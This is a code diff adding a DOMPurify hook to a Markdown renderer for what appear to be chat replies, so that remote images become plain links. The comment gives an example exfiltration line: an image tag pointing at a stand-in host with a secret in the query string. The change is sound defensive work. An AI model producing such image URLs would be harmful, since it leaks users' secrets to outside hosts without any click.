@@ -3,6 +3,21 @@ import DOMPurify from "https://cdn.jsdelivr.net/npm/dompurify@3/+esm";
 
 marked.setOptions({ breaks: true, gfm: true });
 
+// A remote image loads with no click, so a reply like ![](https://x/?d=SECRET)
+// would send data out. Remote images become plain links; the CSP in
+// index.html (img-src 'self' data:) backs this up for CSS and raw HTML.
+DOMPurify.addHook("afterSanitizeElements", (node) => {
+  if (node.nodeName !== "IMG") return;
+  const src = node.getAttribute("src") || "";
+  if (src.startsWith("data:") || src.startsWith("/")) return;
+  const link = document.createElement("a");
+  link.href = src;
+  link.rel = "noopener noreferrer nofollow";
+  link.target = "_blank";
+  link.textContent = `[图片] ${node.getAttribute("alt") || src}`;
+  node.replaceWith(link);
+});
+
 function renderMarkdown(text) {
   return DOMPurify.sanitize(marked.parse(text || ""));
 }
